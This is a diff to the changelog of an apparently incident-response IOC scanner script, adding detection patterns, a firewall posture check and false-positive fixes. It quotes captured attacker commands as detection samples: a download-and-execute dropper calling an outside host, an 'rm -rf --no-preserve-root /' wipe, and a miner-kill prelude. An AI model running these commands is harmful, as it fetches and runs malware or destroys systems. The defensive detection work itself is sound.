@@ -402,33 +402,369 @@ versioned per the affected component.
   refusal, and failure-mode rehearsal (cross-fs mv, CDN unreachable,
   malformed IP, traversal).
 
-## sessionscribe-ioc-scan.sh v2.7.6 — 2026-05-03
+## sessionscribe-ioc-scan.sh v2.7.9 — 2026-05-03
+
+### Added
+- **CSF firewall posture detector (`check_csf_posture`).** Validates that
+  ConfigServer Firewall is installed AND actually enforcing on each fleet
+  host. "Installed but not loaded" is a common silent-failure mode — the
+  binary lives in PATH and the operator assumes protection while iptables
+  is wide open. New `posture` section sits between `destruction` and
+  `probe` in SECTION_ORDER and surfaces 12 break-modes:
+
+    1. CSF/lfd not installed (`posture_csf_not_installed`, advisory)
+    2. `/etc/csf/csf.disable` administrative kill-switch
+       (`posture_csf_administratively_disabled`, advisory)
+    3. csf.conf missing while binary present
+       (`posture_csf_conf_missing`, warning)
+    4. `TESTING="1"` flag (`posture_csf_testing_mode`, warning)
+    5. lfd daemon dead (`posture_csf_lfd_not_running`, warning)
+    6. iptables binary missing (`posture_csf_iptables_missing`, warning)
+    7. `csf -v` self-test fails (`posture_csf_binary_self_test_fail`,
+       warning)
+    8. CSF terminal chains absent in iptables — LOCALINPUT/LOCALOUTPUT/
+       LOGDROPIN (`posture_csf_chains_absent`, warning; bumps to
+       `posture_csf_firewall_open` evidence-tier when INPUT policy is
+       also ACCEPT — firewall effectively off)
+    9. INPUT chain does not jump to LOCALINPUT — orphaned chains
+       (`posture_csf_chains_orphaned`, warning)
+   10. LOCALINPUT exists with INPUT jump but zero rules — interrupted
+       `csf -r` (`posture_csf_chains_empty`, warning)
+   11. `LF_IPSET="1"` promised but ipset binary missing or no sets
+       loaded (`posture_csf_ipset_binary_missing` /
+       `posture_csf_ipset_no_sets`, warning)
+   12. Healthy roll-up — all hard probes pass
+       (`posture_csf_active`, info, OK-tier in matrix). Records
+       `localin_rules`, `lfd_pid`, `csf_version`, `input_policy`,
+       `lf_ipset`, `ipset_sets` so fleet aggregators get a positive
+       per-host green status.
+
+  Severity discipline: posture findings use the `posture_` key prefix
+  (never `ioc_`) so they surface in the section matrix and JSON envelope
+  without flipping host_verdict to SUSPICIOUS/COMPROMISED — the IOC
+  engine is reserved for attacker-evidence rows. Posture is defensive
+  degradation, not exploitation.
+
+  Snapshot-aware: `--root` mode emits a single `posture_csf_snapshot_skip`
+  info row and bypasses live iptables/lfd probes.
+
+  lfd liveness probe is robust 3-stage: pidfile + `/proc/<pid>/comm`
+  verification (defends against stale-pid reuse), then pidof, then
+  pgrep fallback. Accepts both `lfd` (EL7+) and `perl` (EL6 lfd.pl)
+  comm strings.
+
+  CL6 / bash 4.1 floor verified: every local initialized, no `[[ -v ]]`,
+  no namerefs, `iptables -n` (no DNS lookups against firewalled
+  resolvers), `iptables -S` for jump enumeration over `-nL` parsing.
+
+  Driver: fleet-wide validation of CSF integrity following
+  IC-5790 / SessionScribe response — operators need to know which
+  hosts have intact firewalls vs broken-state hosts where defensive
+  posture has silently degraded.
+
+## sessionscribe-ioc-scan.sh v2.7.8 — 2026-05-03
+
+### Added
+- **Pattern K — Cloudflare-fronted /Update second-stage backdoor.**
+  Surfaced by Colin Clare on host.imagicktest 2026-05-03 16:28 CDT and
+  independently captured in Vishnu Narayanan's 2026-05-01 03:59 CDT
+  single-host kill-chain dump. Distinct from Pattern C (different
+  infrastructure, different fetch logic) and represents a more capable
+  second-stage backdoor than the Mirai/nuclear.x86 drop. Runs after the
+  harvester (Pattern F) completes — same actor toolchain. Captured
+  dropper shape:
+
+      F=/tmp/.u$$; (wget -q -O "$F" 'https://cp.dene.de.com/Update' \
+        || curl -sk -o "$F" 'https://cp.dene.de.com/Update') \
+        && chmod 755 "$F" && "$F" -s; rm -f "$F"
+
+  Two IOCs scanned in shell history (HISTORY_FILES_GLOB), both routed
+  through `_classify_history_match` so responder `grep cp.dene` /
+  `history|grep cp.dene.de.com` etc. don't FP into strong-tier:
+  - **K1: PATTERN_K_BACKDOOR_HOST literal `cp.dene.de.com`**
+    - hostile (download/exec verb adjacent) → `ioc_pattern_k_backdoor_fetch`
+      (`ioc_pattern_k_backdoor_host_referenced`) strong/8 with
+      hostile/diagnostic/unknown line counts and `corroborated_by`
+      field flagging K2 if also seen
+    - unknown shape (e.g. `echo cp.dene.de.com >> notes`) →
+      `ioc_pattern_k_backdoor_review` (`ioc_pattern_k_backdoor_host_review`)
+      warning/4
+    - diagnostic only → `ioc_pattern_k_backdoor_diagnostic`
+      (`ioc_pattern_k_backdoor_diagnostic_only`) info/0
+  - **K2: PATTERN_K_TMP_RE shape `F=/tmp/\.u([$][$]|[0-9]+)`** —
+    paranoid PID-tagged hidden temp-file pattern. The literal `$$`
+    form (as typed in bash_history) and the `[0-9]+` form (echo-
+    constructed expansion) are both matched via portable `[$][$]`
+    character class. Standalone emit only when K1 did NOT also fire
+    (otherwise K1 captures it as corroboration field):
+    `ioc_pattern_k_tmpfile_paranoid` (`ioc_pattern_k_pid_tempfile_shape`)
+    warning/3 - shape alone has FP risk in legitimate sysadmin one-liners.
+
+  Network-control caveat preserved per dossier: `cp.dene.de.com` is
+  Cloudflare-fronted shared anycast; do NOT blackhole at edge. The
+  emit's `note` field flags this and recommends Cloudflare T&S
+  coordination for zone takedown.
+
+- **Pattern L — filesystem-nuke (`rm -rf --no-preserve-root /`).**
+  Surfaced in Vishnu's 2026-05-01 capture; Nicholas Welch's 2026-05-03
+  fleet (host 57178T + 13 others "command not found" / "Killed by
+  signal 9 / timeout") flagged as candidate cohort. The no-ransom,
+  no-extortion, scorched-earth destruction variant — same kill-chain
+  as Patterns A/B/C/H, attacker-selectable terminal payload. Captured
+  shape (wrapped in `__CMD_START__/__CMD_END__` envelope, different
+  from Pattern F's `__S_MARK__/__E_MARK__` recon envelope):
+
+      printf '__CMD_START__'; /bin/bash -c \
+        'rm -rf --no-preserve-root / &disown' 2>&1; printf '__CMD_END__'
+
+  - **L1: PATTERN_L_NUKE_RE** primary signal
+    (`rm[[:space:]]+-rf[[:space:]]+--no-preserve-root[[:space:]]+/`),
+    classified via `_classify_history_match`:
+    - hostile → `ioc_pattern_l_filesystem_nuke`
+      (`ioc_pattern_l_no_preserve_root_rm`) strong/10 — REIMAGE-only
+      destruction
+    - unknown → `ioc_pattern_l_filesystem_nuke_review`
+      (`ioc_pattern_l_no_preserve_root_review`) warning/4
+    - diagnostic only → `ioc_pattern_l_filesystem_nuke_diagnostic`
+      (`ioc_pattern_l_no_preserve_root_diagnostic_only`) info/0
+  - **L2: PATTERN_L_CMD_START / PATTERN_L_CMD_END** envelope
+    corroborator (`__CMD_START__`/`__CMD_END__`). When found alongside
+    L1, L1's emit carries the `corroborated_by` field. When found
+    standalone (no nuke command itself, e.g. command rotated out of
+    history), `ioc_pattern_l_cmd_envelope`
+    (`ioc_pattern_l_destructive_cmd_envelope`) warning/4 — destructive-
+    class harvester ran, manual review.
+
+  Note: live filesystem on a successful Pattern L hit is empty; the
+  primary detection scenario is forensic against an Acronis backup
+  mounted as `--root`. Snapshot-mode (`ROOT_OVERRIDE`) currently runs
+  Pattern J only — extending K/L to snapshot mode requires
+  ROOT_OVERRIDE-aware HISTORY_FILES_GLOB and is queued for the next
+  release.
+
+- **Pattern F additional marker — `__CMD_DONE_<nanosec_epoch>__`.**
+  Same actor toolchain (rev5 dossier; observed on Vishnu's host
+  `__CMD_DONE_1777517985331303156__` and imagicktest
+  `__CMD_DONE_1777518004367598800__`). PATTERN_F_CMD_DONE_RE
+  (`__CMD_DONE_[0-9]+__`) routed through `_classify_history_match`
+  regex mode. Three tiers parallel to the existing __S_MARK__ shapes:
+  - hostile → `ioc_pattern_f_cmd_done`
+    (`ioc_pattern_f_cmd_done_marker`) strong/8 (slightly lower than
+    __S_MARK__'s strong/10 — single marker is a weaker signal than the
+    full envelope alone)
+  - unknown → `ioc_pattern_f_cmd_done_review` warning/3
+  - diagnostic only → `ioc_pattern_f_cmd_done_diagnostic` info/0
+
+- **Pattern G lsyncd-amplification corroboration.** When Pattern G
+  fires (any of the 3 Pattern G branches: forged-mtime+IP-labeled
+  strong, IP-labeled-only review, oddpath-keys review) AND the host
+  has lsyncd evidence (process via `pgrep -x lsyncd`, or
+  `/etc/lsyncd/` config dir, or `/etc/lsyncd*.conf` /
+  `/etc/lsyncd*.lua` config file via `compgen -G`), emit
+  `ioc_pattern_g_lsyncd_amplification`
+  (`ioc_pattern_g_lsyncd_cluster_blast_radius`) warning/4 with an
+  `evidence` field pointing to which detector fired. Per Norman Dumond
+  2026-05-03 10:39 dossier: lsyncd master compromise = automatic
+  compromise of every replica via the cluster's legitimate replication
+  keypair. The amplification emit doesn't escalate THIS host's verdict
+  (Pattern G already did) but surfaces blast-radius for remediation —
+  revoke + reissue the cluster's keypair, not just this host's.
+
+- **Pattern C second binary host `87.121.84.243`.** rev5 addition (Rahul
+  Krishnan, 2026-05-03 case 46501374, host.eworksinc.com). Same /24 as
+  the original `87.121.84.78`, same actor scaling infrastructure.
+  Multiple active nuclear.x86 processes still running as root —
+  confirms Pattern C can run in active-process mode in addition to the
+  originally-documented hit-and-run. Added as `PATTERN_C_C2_IP_2` and
+  OR'd into both the bash_history C2-reference scan and the
+  cron/profile.d persistence-path scan.
+
+- **`fmt_offense_detail` routing for Patterns K, L.** Added
+  `(ioc_pattern_k_*) → echo K` and `(ioc_pattern_l_*) → echo L` to the
+  area-letter mapping at line ~1346.
+
+- **`ATTACKER_IPS[]` rev5 additions.** `87.121.84.243` (Pattern C
+  variant - second binary host); `67.205.166.246` (badpass exploit,
+  Jamie 2026-05-03 08:02 null-routed; source
+  cloudvpstemplate.1g9j3u-lwsites.com).
 
 ### Fixed
-- **`pattern_g_deep_checks`: `find -maxdepth 2` produced non-canonical
-  authorized_keys probe paths.** Mirrors the same fix in mitigate
-  v0.7.1's `kill_sshkey_canonical_paths` (sentinel finding A-01).
-  `find /home -maxdepth 2 -mindepth 1 -type d` returns BOTH depth-1
-  user homes (`/home/<user>`) and depth-2 subdirs
-  (`/home/<user>/<sub>`). Appending `/.ssh/authorized_keys` to the
-  depth-2 paths produced non-canonical probe targets like
-  `/home/<user>/<sub>/.ssh/authorized_keys`. Mostly cosmetic — the
-  build-time `[[ -f ]]` skip filtered most non-existent paths — but
-  the per-key-comment validation loop (Pattern G's
-  `SSH_KNOWN_GOOD_RE` whitelist) ran against any depth-2 file that
-  happened to exist with a `.ssh/authorized_keys` shape, which is
-  not the cPanel canonical layout.
+- **`_classify_history_match` exec_verb_re extension: path-prefixed
+  shell forms.** Sentinel-driven fix surfaced during Pattern L fixture
+  run. The captured Pattern L shape is `/bin/bash -c 'rm -rf
+  --no-preserve-root / &disown'` — but the helper's `exec_verb_re`
+  only recognized the bareword forms (`source|eval|exec|bash|sh`). The
+  `/bin/bash` path-prefix form was preceded by `/`, not in the
+  word-boundary set `(^|[[:space:]]|;|&)`, so the line classified as
+  unknown (review tier) instead of hostile (strong tier). Extended the
+  alternation to also recognize `/bin/sh`, `/bin/bash`, `/usr/bin/sh`,
+  `/usr/bin/bash`. Negative regression check: paths containing `bash`
+  as substring (e.g. `/opt/bashlike/runner`) are NOT matched (the
+  word-boundary preceding still requires start/space/`;`/`&`, and the
+  shell-name alternation enumerates only the legit shell paths).
+  Affects all callers of `_classify_history_match` (Patterns C, F,
+  H2, K, L) — defensive widening with no FP regression risk per
+  fixture trace.
 
-  Fix: `-maxdepth 1` (depth-1 only).
-
-  Mirror policy (workspace CLAUDE.md): "Shared-lib bug → verify all
-  consumers." The `find /home -maxdepth N` pattern is the de-facto
-  shared idiom for canonical authorized_keys discovery across
-  mitigate + ioc-scan; both got the fix in the same triage cycle.
+- **K2/L2 standalone-emit gate now reads K1/L1 emit tier, not file
+  presence.** Sentinel SHOULD-FIX (rdf-reviewer 4-pass on v2.7.8).
+  Previous gate `(( ${#_k2_files[@]} > 0 && ${#_k1_files[@]} == 0 ))`
+  silently swallowed K2/L2 hostile signals when K1/L1 fired
+  diagnostic-only (e.g., responder `grep cp.dene` lands in one
+  history file while a real `F=/tmp/.u$$` dropper in another file
+  goes uncaptured because `_k1_files` was non-empty). Rewritten to
+  track `_k1_emit_real` / `_l1_emit_real` flags set inside the
+  strong-OR-warning emit branches; gate the standalone K2/L2 emits
+  on `_k1_emit_real == 0` / `_l1_emit_real == 0`. Diagnostic-only K1/L1
+  no longer suppresses corroborating shape evidence.
 
 ### Verification
-- bash -n + shellcheck -S error pass.
-- gawk 3.x floor preserved (no `{n}` intervals, no 3-arg `match`).
+- bash -n + shellcheck -S warning pass (only pre-existing warnings;
+  none in new K/L/F-CD/G-lsyncd code).
+- gawk 3.x floor preserved (no `{n}` intervals, no 3-arg `match`,
+  ENVIRON-passed needles).
+- bash 4.1 / set -u / EL6 floor preserved (`compgen -G` for lsyncd
+  config glob is bash 4.0+; `pgrep -x` is procps-ng 3.2+ which
+  predates EL6's procps-ng 3.2.8).
+- Acceptance fixture suite (`/tmp/ioc-scan-fixture-test.sh`): 52/52
+  pass covering Pattern F (6), Pattern C regression (2), Pattern H2
+  (12), Pattern A (7), Pattern K (7 — dropper one-liner /
+  responder-grep-FP / cat-grep-FP / echo-unknown / regex K2 shape
+  positive+negative cases), Pattern L (4 — bare nuke / bash -c
+  wrapped / responder-grep-FP / history-grep-FP), Pattern F __CMD_DONE
+  (4 — bare hostile / responder grep / regex positive numeric / regex
+  negative non-numeric), exec_verb_re extension (5 — /bin/bash,
+  /usr/bin/bash, /bin/sh, /usr/bin/sh + negative /opt/bashlike).
+
+### Known gaps (queued for next release)
+- **Snapshot-mode K/L coverage.** The most useful Pattern L scenario
+  (forensic against Acronis backup of nuked host) is currently outside
+  snapshot-mode's scope. Requires ROOT_OVERRIDE-prepending the
+  HISTORY_FILES_GLOB across Patterns C/F/H/K/L; deferred to keep this
+  release's scope tight.
+- **Pattern D recon-stage detection.** Currently detects persistence
+  stage (sptadm in accounting.log + WHM_FullRoot token). The recon
+  sequence (`/json-api/{version,gethostname,listaccts,getdiskusage,
+  systemloadavg,getips}` from Go-http-client/1.1 against cpsrvd
+  ports) is documented but not detected — would require log-walk
+  with time-window aggregation.
+- **Pattern J object-key string IOC.** The OVH bucket
+  `s3-screenshots.s3.eu-west-par.io.cloud.ovh.net` is IR-team
+  transport infra (do NOT blocklist - prior-session memory) but the
+  attacker-specific object key `/G7t7gnXGGms6Ki6AW9lte6WkQ` could be
+  searched in cron/at-jobs/systemd-units as a string IOC. Judgment
+  call deferred.
+
+## sessionscribe-ioc-scan.sh v2.7.7 — 2026-05-03
+
+### Fixed
+- **Diagnostic-shape FP filter parity for Patterns F, H2, H3, A.** v2.7.5
+  shipped the diagnostic-shape classifier for Pattern C
+  (`ioc_pattern_c_nuke_trace_diagnostic`), but the same FP class was still
+  unfixed for the other history-string and README-content primitives.
+  Discovered live on `host.imagejax.com` (64.91.237.146) on 2026-05-03 22:15
+  UTC: under v2.7.5 the host returned CLEAN for Pattern C (the new filter
+  caught the `history | grep nuclear.x86` line) but Patterns F, H, A still
+  carried unguarded literal-grep emits that would have flipped a responder-
+  checked host to COMPROMISED on the next scan.
+
+  - **Helper hoist.** v2.7.5's inline awk classifier is now a script-level
+    helper `_classify_history_match <regex|literal> <needle> <files...>`,
+    returning `h=N d=N u=N fhe=EPOCH file_h=PATH` for any caller. Pattern C
+    refactored to call the helper with `regex 'nuclear\.x86'` (semantics
+    preserved; a small accuracy fix lands at the same time - `mtime_epoch`
+    on the strong-tier emit now stat()s the actual hostile-shape file
+    rather than the first matched file, so `mtime_epoch` and `sample_path`
+    refer to the same artifact).
+
+  - **Pattern F (`__S_MARK__` harvester envelope).** Previously emitted
+    `ioc_pattern_f_harvester` strong/10 unconditionally on any literal
+    match in `${HISTORY_FILES_GLOB[@]}`. FP shape:
+    `grep __S_MARK__ /root/.bash_history` (responder check) → string lands
+    in history → next scan fires strong/COMPROMISED. Now classified per
+    line via the shared helper:
+    - hostile shape → `ioc_pattern_f_harvester` strong/10 (unchanged
+      offense_id; new `hostile_lines`/`diagnostic_lines`/`unknown_lines`
+      classifier-count fields; `ts_epoch_first` now reflects FIRST
+      hostile-shape match, not first occurrence, so diag-shape lines do
+      not pollute kill-chain reconstruction)
+    - unknown shape → new `ioc_pattern_f_review_undetermined`
+      (`ioc_pattern_f_smark_review`) warning/5
+    - diagnostic-only → new `ioc_pattern_f_diagnostic_only`
+      (`ioc_pattern_f_smark_diagnostic_only`) info/0
+
+  - **Pattern H2 (`pkill -9 nuclear.x86 kswapd01 xmrig` kill prelude).**
+    The diag_re shape filter does NOT apply: `pkill` is a destructive verb
+    on both attacker and responder paths, so the same line is the
+    competitor-kill prelude (followed by an install primitive) OR a
+    responder cleanup (followed by `ps -ef | grep -v grep` to verify the
+    kill took). New helper `_classify_kill_prelude_context <file> <re>
+    <ctx_lines>` (default ctx=3) classifies by *adjacency*:
+    - hostile if any of the next 3 command lines matches an install
+      primitive (`wget|curl|fetch|lwp-download|tftp|base64 -d|chmod
+      +x|<octal>|bash <(|./seobot`) → `ioc_pattern_h_kill_prelude`
+      strong/8 (offense_id unchanged; new classifier-count + adjacency
+      semantics)
+    - diagnostic if a defensive verify (`ps|pgrep|echo done|exit|true`)
+      or empty line appears within ctx → new
+      `ioc_pattern_h_kill_prelude_diagnostic`
+      (`ioc_pattern_h_competitor_kill_diagnostic_only`) info/0
+    - unknown (isolated kill, no clear adjacency on either side) → new
+      `ioc_pattern_h_kill_prelude_review`
+      (`ioc_pattern_h_competitor_kill_review`) warning/4
+
+  - **Pattern H3 (`ALLDONE` end marker).** Previously emitted
+    `ioc_pattern_h_alldone` warning/5 unconditionally on any literal
+    `ALLDONE` substring match. The code comment on the block already
+    called out the shape: *"warning-tier - generic enough to FP, useful
+    only alongside H1/H2/H4."* But the implementation did not enforce the
+    gate. Now suppressed entirely unless corroborated by H1
+    (`seobot.php` on disk), H2-hostile (kill-prelude in hostile shape),
+    or H4 (`/tmp/seobot.zip` magic match). When corroborated, the emit
+    carries a new `corroborated_by` field listing which signals fired.
+    H3 emit moved to AFTER H4 in the source; H1/H2/H4 set local boolean
+    flags read by the H3 gate.
+
+  - **Pattern A (qTox ransom README).** Previously emitted
+    `ioc_pattern_a_readme` strong/10 on any file containing `qtox`,
+    `TOX ID`, `Sorry-ID`, or the literal `PATTERN_A_TOX_ID` hash. FP
+    shape: responder IR notes (`/root/IR-notes-IC-5790.md`,
+    `/root/notes-2026-05-02.txt`, `/root/runbooks/`, `/root/.claude/`
+    Claude Code working copies) routinely carry the dossier TOX_ID as
+    documentation. Added content/path-shape filter:
+    - **Documentation-shape allowlist** (path matches
+      `^/root/(IR|notes|runbooks|\.claude|\.cache)/|IR-notes|runbook|notes-[0-9]`)
+      OR **file >200 lines** → new `ioc_pattern_a_readme_documentation`
+      (`ioc_pattern_a_ransom_readme_documentation`) info/0 with new
+      `line_count` field
+    - **Exact TOX_ID hash + short file outside allowlist** →
+      `ioc_pattern_a_readme` strong/10 (offense_id unchanged; canonical
+      drop)
+    - **qtox/Sorry-ID strings without exact TOX_ID hash + short file
+      outside allowlist** → new `ioc_pattern_a_readme_review`
+      (`ioc_pattern_a_ransom_readme_review`) warning/5
+
+  All new offense_ids share the existing `ioc_pattern_<letter>_*` prefix
+  scheme so the area-tag mapping at `fmt_offense_detail()` (`ioc_pattern_a_*
+  → A`, `ioc_pattern_f_* → F`, `ioc_pattern_h_* → H`) routes them correctly
+  with no further changes. Verdict math: info/0 → no impact, warning/4-5 →
+  SUSPICIOUS (`ioc_review++`), strong/8-10 → COMPROMISED (`ioc_critical++`).
+
+  Implementation is gawk-3.x-clean (2-arg `match` via `~`, char-class
+  repetition `[0-7][0-7][0-7]` not `{3}`, ENVIRON-passed needle, no 3-arg
+  `match()`). bash 4.1 / set -u / gawk 3.x floor preserved (no `local
+  -n`, no negative-substring `${var: -N}`, no `mapfile -d`, no `${var^^}`;
+  new `[[ str =~ $regex_var ]]` uses unquoted RHS as required at 4.1).
+
+### Fleet-state context
+- **27-host v3-CONFIRMED list** (intake-2026-05-03) was produced under
+  v2.7.2 - no Pattern C diag fix, let alone F/H/A. The `imagejax.com` FP
+  was caught manually. Re-classify the destruction_iocs in
+  `intake-2026-05-03/outputs/records.jsonl` against v2.7.6: hosts whose
+  only destructive evidence is a literal-string match in bash_history
+  (Pattern C, F, H) or qtox/Sorry-ID strings in a long IR notes file
+  (Pattern A) without corroborating filesystem/process/network signal are
+  likely-FPs needing responder-checks before customer-notify lists.
 
 ## sessionscribe-ioc-scan.sh v2.7.5 — 2026-05-03
 
